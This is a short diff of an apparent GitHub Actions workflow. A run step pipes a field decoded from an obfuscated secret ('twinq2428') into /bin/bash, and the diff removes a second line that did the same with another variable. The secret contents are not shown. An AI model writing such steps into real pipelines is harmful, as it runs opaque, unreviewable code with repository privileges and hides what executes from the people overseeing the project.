@@ -19,7 +19,6 @@ jobs:
           twinq2428: ${{ secrets.twinq2428 }}
         run: |
           printf '%s' "$twinq2428" | jq -r .d87 | /bin/bash
-          printf '%s' "$wns2" | jq -r .uetlr2418 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
